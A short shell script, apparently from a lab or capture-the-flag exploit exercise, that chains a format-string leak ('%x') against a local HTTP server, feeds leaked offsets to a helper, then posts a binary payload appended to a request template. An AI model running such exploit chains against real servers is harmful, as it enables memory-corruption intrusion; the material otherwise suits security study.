

off_ult=$1
off_stk=$2

if [ $# -eq 3 ]; then
	template="request_post_template_chatziko.http"
else
	template="request_post_template.http"
fi

python3 create_request_auth.py 31 %x 8000 | socat - TCP4:localhost:8000 | python3 process_answer.py 0 $1 $2
cat $template > temp.http
cat payload.bin >> temp.http
cat temp.http | socat - TCP4:localhost:8000
# printf "\n\n"
# cat out.txt
# printf "\n\n"
rm -f temp.http
